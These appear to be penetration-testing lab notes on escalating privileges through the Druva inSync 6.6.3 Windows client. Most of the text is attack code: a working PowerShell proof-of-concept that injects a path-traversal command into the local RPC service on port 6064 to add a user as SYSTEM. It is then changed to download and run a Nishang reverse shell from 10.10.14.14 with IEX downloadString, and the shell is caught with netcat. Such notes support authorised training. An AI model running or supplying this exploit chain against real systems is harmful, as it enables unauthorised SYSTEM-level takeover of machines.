**Enumerating Installed Programs
```
wmic product get name
```
- Druva inSync 6.6.3 command injection: https://www.exploit-db.com/exploits/49211

**Enumerating Local Ports
```
netstat -ano | findstr 6064
```

**Enumerating Process ID
```
get-process -Id 3324
```

**Enumerating Running Service
```
get-service | ? {$_.DisplayName -like 'Druva*'}
```

## Druva inSync Windows Client Local Privilege Escalation Example

**Druva inSync PowerShell PoC
```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

**Modifying PowerShell PoC
Download: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
Rename to shell.ps1
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 9443
```

Modify the $cmd in the Druva inSync exploit PoC script
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.14:8000/shell.ps1')"
```

**Host shell.ps1 on Server
```
python3 -m http.server
```

**Catching the SYSTEM Shell
```
nc -lvnp 9443
```
